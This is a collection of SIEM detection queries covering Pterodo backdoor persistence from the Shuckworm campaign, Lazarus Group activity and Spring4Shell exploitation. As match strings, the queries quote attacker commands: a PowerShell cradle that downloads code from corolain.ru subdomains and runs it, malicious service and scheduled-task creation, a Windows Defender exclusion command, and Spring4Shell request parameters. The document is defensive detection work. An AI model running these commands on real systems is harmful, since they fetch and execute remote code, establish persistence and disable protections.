# Armageddon/Shuckworm group Espionage campaign
### Detect scheduled tasks created by variant Backdoor.Pterodo.B to establish persistence.
#### Microsoft Windows

```text
rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "UDPSync" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "hailJPT" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "SyncPlayer" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "enormouslyAKeIXNE" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "UDPSync" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "hailJPT" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "SyncPlayer" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "enormouslyAKeIXNE" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "UDPSync" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "hailJPT" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "UDPSync" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "hailJPT" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "/sc" AND resourcecustomfield2 contains "SyncPlayer" AND resourcecustomfield2 contains "wscript.exe" AND resourcecustomfield2 contains "enormouslyAKeIXNE" AND resourcecustomfield2 contains "jewels" AND resourcecustomfield2 contains "joking" AND resourcecustomfield2 contains "VBScript" AND resourcecustomfield2 contains "joyful")
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname ends with "schtasks.exe" AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "/sc" AND resourcecustomfield1 contains "SyncPlayer" AND resourcecustomfield1 contains "wscript.exe" AND resourcecustomfield1 contains "enormouslyAKeIXNE" AND resourcecustomfield1 contains "jewels" AND resourcecustomfield1 contains "joking" AND resourcecustomfield1 contains "VBScript" AND resourcecustomfield1 contains "joyful")
```
### Detects leveraging powershell to download a powershell script from corolain[.]ru subdomains.
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND baseeventid = 4104 and message contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp""
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and (resourcecustomfield1 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"" OR resourcecustomfield2 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (resourcecustomfield1 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"" OR resourcecustomfield2 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (resourcecustomfield1 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"" OR resourcecustomfield2 contains ""$tmp = $(New-Object net.webclient).DownloadString('http://'+ [System.Net.DNS]::GetHostAddresses([string]$(Get-Random)+'.corolain.ru') +'/get.php'); Invoke-Expression $tmp"")
```
### Detects abusing wscript by Backdoor.Pterodo.C
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND filename ends with ".tbi" and resourcecustomfield1 contains "VBScript /w /ylq /ib /bxk  //b /pgs"
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname contains "wscript.exe" AND resourcecustomfield1 contains "VBScript /w /ylq /ib /bxk  //b /pgs"
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname contains "wscript.exe" AND resourcecustomfield1 contains "VBScript /w /ylq /ib /bxk  //b /pgs"
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname contains "wscript.exe" AND resourcecustomfield1 contains "VBScript /w /ylq /ib /bxk  //b /pgs"
```
### Detects abusing wscript by Backdoor.Pterodo.D
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND filename ends with ".ql" and resourcecustomfield1 contains "VBScript /tfj /vy /g /cjr /rxia  //b /pyvc"
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname contains "wscript.exe" AND resourcecustomfield1 contains "VBScript /tfj /vy /g /cjr /rxia  //b /pyvc"
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname contains "wscript.exe" AND resourcecustomfield1 contains "VBScript /tfj /vy /g /cjr /rxia  //b /pyvc"
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and destinationprocessname contains "wscript.exe" AND resourcecustomfield1 contains "VBScript /tfj /vy /g /cjr /rxia  //b /pyvc"
```
# Lazarus Group targeting South Korean users
### Detects scheduled tasks created at various stages
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "sc create uso start= auto binPath= “cmd.exe /c start /b C:\Programdata\addins.bat” DisplayName= uso")
rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "sc create uso start= auto binPath= "cmd.exe /c start /b C:\Windows\addins\addins.bat" DisplayName= uso")

rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "schtasks" AND resourcecustomfield1 contains "cmd.exe /c C:\ProgramData\Intel\Intel.bat" AND resourcecustomfield1 contains "arm" AND resourcecustomfield1 contains "sc MINUTE" 

rg_functionality = "Microsoft Windows" AND baseeventid = 4698 AND (resourcecustomfield1 contains "/CREATE" AND resourcecustomfield1 contains "schtasks" AND resourcecustomfield1 contains "cmd.exe /c C:\ProgramData\Adobe\arm.bat" AND resourcecustomfield1 contains "arm" AND resourcecustomfield1 contains "sc MINUTE")
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "sc create uso start= auto binPath= “cmd.exe /c start /b C:\Programdata\addins.bat” DisplayName= uso")

rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "sc create uso start= auto binPath= "cmd.exe /c start /b C:\Windows\addins\addins.bat" DisplayName= uso")

rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "schtasks" AND resourcecustomfield2 contains "cmd.exe /c C:\ProgramData\Intel\Intel.bat" AND resourcecustomfield2 contains "arm" AND resourcecustomfield2 contains "sc MINUTE")

rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND resourcecustomfield2 contains "schtasks" AND resourcecustomfield2 contains "cmd.exe /c C:\ProgramData\Adobe\arm.bat" AND resourcecustomfield2 contains "arm" AND resourcecustomfield2 contains "sc MINUTE")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "sc create uso start= auto binPath= “cmd.exe /c start /b C:\Programdata\addins.bat” DisplayName= uso")

rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "sc create uso start= auto binPath= "cmd.exe /c start /b C:\Windows\addins\addins.bat" DisplayName= uso")

rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "schtasks" AND resourcecustomfield2 contains "cmd.exe /c C:\ProgramData\Intel\Intel.bat" AND resourcecustomfield2 contains "arm" AND resourcecustomfield2 contains "sc MINUTE")

rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND resourcecustomfield2 contains "schtasks" AND resourcecustomfield2 contains "cmd.exe /c C:\ProgramData\Adobe\arm.bat" AND resourcecustomfield2 contains "arm" AND resourcecustomfield2 contains "sc MINUTE")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "sc create uso start= auto binPath= “cmd.exe /c start /b C:\Programdata\addins.bat” DisplayName= uso")

rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "sc create uso start= auto binPath= "cmd.exe /c start /b C:\Windows\addins\addins.bat" DisplayName= uso")

rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND (resourcecustomfield2 contains "/CREATE" AND resourcecustomfield2 contains "schtasks" AND resourcecustomfield2 contains "cmd.exe /c C:\ProgramData\Intel\Intel.bat" AND resourcecustomfield2 contains "arm" AND resourcecustomfield2 contains "sc MINUTE")

rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and sourceprocessname ends with "schtasks.exe" AND resourcecustomfield2 contains "schtasks" AND resourcecustomfield2 contains "cmd.exe /c C:\ProgramData\Adobe\arm.bat" AND resourcecustomfield2 contains "arm" AND resourcecustomfield2 contains "sc MINUTE")
```
### Detects compiled html files being dropped in the host.
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND (filepath contains "C:\programdata\chmtemp\chmext.exe" OR oldfilepath contains "C:\programdata\chmtemp\chmext.exe")
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (filepath contains "C:\programdata\chmtemp\chmext.exe" OR oldfilepath contains "C:\programdata\chmtemp\chmext.exe" OR customstring54 contains "C:\programdata\chmtemp\chmext.exe" OR customstring59 contains "C:\programdata\chmtemp\chmext.exe")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (filepath contains "C:\programdata\chmtemp\chmext.exe" OR oldfilepath contains "C:\programdata\chmtemp\chmext.exe" OR filename contains "C:\programdata\chmtemp\chmext.exe")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (filepath contains "C:\programdata\chmtemp\chmext.exe" OR oldfilepath contains "C:\programdata\chmtemp\chmext.exe" OR filename contains "C:\programdata\chmtemp\chmext.exe")
```
### Detects executable IntelRST.exe trying to masquerade as legit executables owned by Intel.
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" AND (filepath contains "C:\ProgramData\Intel\IntelRST.exe" OR oldfilepath contains "C:\ProgramData\Intel\IntelRST.exe")
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (filepath contains "C:\ProgramData\Intel\IntelRST.exe" OR oldfilepath contains "C:\ProgramData\Intel\IntelRST.exe" OR customstring54 contains "C:\ProgramData\Intel\IntelRST.exe" OR customstring59 contains "C:\ProgramData\Intel\IntelRST.exe")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (filepath contains "C:\ProgramData\Intel\IntelRST.exe" OR oldfilepath contains "C:\ProgramData\Intel\IntelRST.exe" OR filename contains "C:\ProgramData\Intel\IntelRST.exe")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (filepath contains "C:\ProgramData\Intel\IntelRST.exe" OR oldfilepath contains "C:\ProgramData\Intel\IntelRST.exe" OR filename contains "C:\ProgramData\Intel\IntelRST.exe")
```
### Detects the command line that adds Windows Defender exclusion for the malicious exe
#### Microsoft Windows
```text
rg_functionality = "Microsoft Windows" and (resourcecustomfield1 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe")
```
#### Endpoint Management Systems
```text
rg_functionality = "Endpoint Management Systems" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") and (resourcecustomfield1 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe" OR resourcecustomfield2 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe")
```
#### Antivirus / Malware / EDR
```text
rg_functionality = "Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") AND (resourcecustomfield1 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe" OR resourcecustomfield2 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe")
```
#### Cloud Antivirus / Malware / EDR
```text
rg_functionality = "Cloud Antivirus / Malware / EDR" AND (deviceaction contains "Process Create" OR deviceaction contains "Childproc" OR deviceaction contains "ProcessRollup2" OR deviceaction contains "Procstart" OR deviceaction contains "Trace Executed Process") (resourcecustomfield1 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe" OR resourcecustomfield2 contains "Powershell -Command Add-MpPreference -ExclusionPath "C:\ProgramData\Intel\IntelRST.exe")
```
# Spring4Shell RCE (CVE-2022-22965)
### Detects Possible Java Application Webshell Process Creation Analytic
#### Unix / Linux / AIX
```text
rg_functionality = “Unix / Linux / AIX” AND baseeventid = “1” AND sourceprocessname ENDS WITH “java” | rare  destinationprocessname transactionstring1
```
### SpringShell PoC Query Parameters Analytic
#### Next Generation Firewall
```text
(rg_functionality = “Next Generation Firewall” OR rg_functionality = “Web Application Firewall” OR rg_functionality = “Web Server” OR rg_functionality = “Web Proxy”) AND (requesturl CONTAINS “.jsp?cmd=” OR requesturl CONTAINS “.jsp?pwd=” OR requesturl CONTAINS “&cmd=”)
```
### Detects Possible Java Application Webshell Process Creation Analytic
```text
rg_functionality = “Endpoint Management Systems” AND (deviceaction = “Process Create” OR deviceaction = “ProcessCreate” OR deviceaction = “Process Create (rule: ProcessCreate)” OR deviceaction = “ProcessRollup2” OR deviceaction = “SyntheticProcessRollUp2” OR deviceaction = “WmiCreateProcess” OR deviceaction = “Trace Executed Process” OR deviceaction = “Process” OR deviceaction = “Childproc” OR deviceaction = “Procstart” OR deviceaction = “Process Activity: Launched”) AND sourceprocessname ENDS WITH “java.exe” | rare  destinationprocessname transactionstring1
```
### SpringShell PoC Query Parameters Analytic
```text
(rg_functionality = “Next Generation Firewall” OR rg_functionality = “Web Application Firewall” OR rg_functionality = “Web Server” OR rg_functionality = “Web Proxy”) AND requesturl CONTAINS “class.module.classLoader.resources.context.parent.pipeline.first”
```



















